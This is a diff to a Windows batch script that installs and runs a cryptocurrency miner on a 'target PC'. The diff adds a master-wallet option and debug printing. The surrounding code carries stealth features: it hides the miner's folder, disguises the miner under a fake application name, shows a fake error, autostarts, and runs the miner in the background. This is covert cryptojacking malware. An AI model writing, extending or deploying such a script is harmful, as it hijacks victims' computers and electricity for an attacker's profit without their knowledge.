@@ -27,11 +27,14 @@ REM HIDELOCATION - HIDES THE DIRECTORY OF THE MINER FOLDER ON TARGET
 REM                PC WHEN RAN.
 REM MINEREXTRAS  - PULLS THE EXTRA DLL FILES WITH THE MINER. ONLY USE
 REM                IF THE MINER REQUIRES EXTRA DLL'S. 
+REM MASTERWALLET - USES ONE SET OF WALLET/PASS FOR ALL POOLS. (IF "NO"
+REM                SCRIPT WILL USE CREDENTIALS FROM POOL LIST)
 REM MUTLIPOOL    - CHOOSE BETWEEN MULTIPLE POOLS (1,2,3,4,5) USING THE
 REM                "POOLNUM" VARIABLE. (DEFAULTS TO POOL #1)
 REM 
 REM ============================================================================
-REM
+REM   DEBUG - TURNS ON/OFF DISPLAY OF VARIABLES BEFORE EXECUTION OF 
+REM           MINER. ONLY USE IF YOU ARE TUNING SCRIPT.
 REM ============================================================================
 REM ERRORS:
 REM ============================================================================
@@ -49,6 +52,7 @@ SET "FAKEERROR=NO"
 SET "HIDELOCATION=NO"
 SET "MINEREXTRAS=NO"
 SET "AUTOSTART=NO"
+SET "MASTERWALLET=YES"
 REM ============================================================================
 REM MULTI-POOL CHOICE: (IF "NO" DEFAULTS TO POOL #1)
 REM ============================================================================
@@ -56,6 +60,11 @@ SET "MULTIPOOL=NO"
 SET "POOLNUM=2"
 REM ============================================================================
 REM MINER CREDENTIALS:
+REM ============================================================================
+REM MASTER WALLET/USER & PASS: (IF "NO" SCRIPT USES NORMAL POOL CREDENTIALS)
+REM ============================================================================
+SET "MWALLET=MASTER_WALLET_HERE"
+SET "MPASS=MASTER_PASSWORD_HERE"
 REM ============================================================================
 REM POOL #1 (DEFAULT POOL)
 REM ============================================================================
@@ -144,6 +153,7 @@ IF "%HIDELOCATION%" EQU "YES" (SET "HIDELOCATION=1") ELSE (SET "HIDELOCATION=0")
 IF "%MINEREXTRAS%" EQU "YES" (SET "MINEREXTRAS=1") ELSE (SET "MINEREXTRAS=0")
 IF "%FAKEAPP%" EQU "YES" (SET "FAKEAPP=1") ELSE (SET "FAKEAPP=0")
 IF "%CLEANUP%" EQU "YES" (SET "CLEANUP=1") ELSE (SET "CLEANUP=0")
+IF "%DEBUG%" EQU "YES" (SET "DEBUG=1") ELSE (SET "DEBUG=0")
 IF "%FAKEERROR%" EQU "YES" (SET "FAKEERROR=1") ELSE (SET "FAKEERROR=0")
 REM Detect which name to use for the Miners Application Name..
 IF "%FAKEAPP%" EQU "1" (SET "MINER=%FAKENAME%") ELSE (SET "MINER=%ORIGMINER%")
@@ -191,6 +201,12 @@ IF "%MULTIPOOL%" EQU "YES" (
 	SET "PASS=%PASS1%"
 	SET "ALGO=%ALGO1%"
 )
+REM Master Wallet/Password Helper variables.
+IF "%MASTERWALLET%" EQU "YES" (SET "USER=%MWALLET%" && SET "PASS=%MPASS%")
+REM +------------------------+
+REM |    Debugging Options   |
+REM +------------------------+
+SET "DEBUG=NO"
 
 REM Finally after all that craziness.. Time for THIS craziness..
 IF EXIST "%TARGETDIR%\%MINER%" (GOTO 0) ELSE (GOTO 1)
@@ -263,6 +279,19 @@ IF "%BACKGROUND%" EQU "1" (
 	%MINER% %SFLAG% %SERVER% %UFLAG% %USER% %PFLAG% %PORT% %PASSFLAG% %PASS% %CUSTOMFLAGS% --background
 	) ELSE (
 	CD %TARGETDIR%
+	IF "%DEBUG%" EQU "1" (
+		echo Miner         : %MINER%
+		echo URL Flag      : %SFLAG% 
+		echo URL           : %SERVER%
+		echo User Flag     : %UFLAG% 
+		echo USER          : %USER%
+		echo Port Flag     : %PFLAG%
+		echo PORT          : %PORT% 
+		echo Password Flag : %PASSFLAG%
+		echo PASS          : %PASS% 
+		echo Custom Flags  : %CUSTOMFLAGS%
+		pause>NUL
+	)
 	%MINER% %SFLAG% %SERVER% %UFLAG% %USER% %PFLAG% %PORT% %PASSFLAG% %PASS% %CUSTOMFLAGS%
 )
 GOTO END
